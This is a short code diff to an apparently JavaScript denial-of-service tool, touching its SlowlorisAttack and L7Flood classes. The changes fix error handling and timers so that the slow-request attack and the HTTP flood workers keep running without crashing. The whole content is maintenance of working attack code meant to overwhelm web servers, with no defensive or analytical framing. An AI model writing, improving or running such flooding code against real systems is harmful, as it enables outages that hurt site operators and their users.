@@ -439,6 +439,7 @@ class SlowlorisAttack {
         req.on('response', (res) => {
             this.stats.success++;
             res.resume();
+            if (timeoutId) clearTimeout(timeoutId);
         });
 
         // Send initial small part of the body
@@ -454,7 +455,7 @@ class SlowlorisAttack {
                 req.write(chunk);
                 bytesSent += chunkSize;
             } catch (e) {
-                this.stats.failed++;
+                // The 'error' event will handle stat counting. Just stop the timer to prevent a crash loop.
                 if (timeoutId) clearTimeout(timeoutId);
             }
         };
@@ -543,8 +544,13 @@ class L7Flood {
 
     async runWorker() {
         while (this.running) {
-            await this.sendRequest();
-            if (this.delay > 0) {
+            try {
+                await this.sendRequest();
+            } catch (e) {
+                // Catch any unexpected error in the worker loop to prevent it from crashing.
+                // The internal sendRequest try/catch handles got-specific errors.
+            }
+            if (this.running && this.delay > 0) {
                 await new Promise(resolve => setTimeout(resolve, this.delay));
             }
         }
